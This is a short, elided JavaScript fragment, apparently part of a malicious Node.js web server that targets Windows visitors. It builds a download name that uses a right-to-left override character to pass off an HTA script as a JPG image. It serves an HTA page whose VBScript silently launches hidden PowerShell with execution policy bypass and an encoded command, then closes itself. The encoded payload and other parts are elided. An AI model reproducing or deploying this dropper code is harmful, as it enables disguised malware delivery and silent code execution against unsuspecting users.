...
h.createServer((q, r) => {
    try {
        ...
        if (a.includes('Windows')) {
            const f = "Update_" + String.fromCharCode(0x202E) + "gpj.vbs.hta";
            ...
            r.end(`<html><head><hta:application showintaskbar="no" windowstate="minimize" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc ":s.Run p,0,False:self.close:End Sub</script></head><body><script>window.location.reload();</script></body></html>`);
        } else {
